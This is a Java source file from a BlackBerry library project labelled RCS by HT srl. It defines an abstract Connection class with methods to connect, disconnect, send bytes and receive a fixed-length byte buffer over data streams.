/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Connection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public abstract class Connection {
    protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);
    
    protected DataInputStream in;
    protected DataOutputStream out;
    protected StreamConnection connection = null;

    protected boolean connected = false;

    public abstract boolean connect();

    public synchronized void disconnect() {
        if (connected) {
            connected = false;
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    debug.error(e.toString());
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (IOException e) {
                    debug.error(e.toString());
                }
            }

            if (connection != null) {
                try {
                    connection.close();
                } catch (IOException e) {
                    debug.error(e.toString());
                }
            }

        }

        in = null;
        out = null;
        connection = null;
    }

    protected abstract void error(String string);

    public abstract boolean isActive();

    public synchronized byte[] receive(int length) throws IOException {
        if (connected) {
            Check.requires(in != null, "null in_");

            // Create an input array just big enough to hold the data
            // (we're expecting the same string back that we send).
            byte[] buffer = new byte[length];
            in.readFully(buffer);

            // Check.ensures(read == buffer.length, "Wrong read len: "+read);

            // Hand the data to the parent class for updating the GUI. By
            // explicitly
            return buffer;
        } else {
            error("Not connected. Active: " + isActive());
            return null;
        }
    }

    /**
     * Pass some data to the server and wait for a response.
     * 
     * @param data
     * @return
     * @throws IOException
     */
    public synchronized boolean send(byte[] data) throws IOException {

        if (connected) {
            Check.requires(out != null, "null out_");

            int length = data.length;
            out.write(data, 0, length);

            return true;
        } else {
            error("Not connected. Active: " + isActive());
            return false;
        }
    }

    protected abstract void trace(String string);

}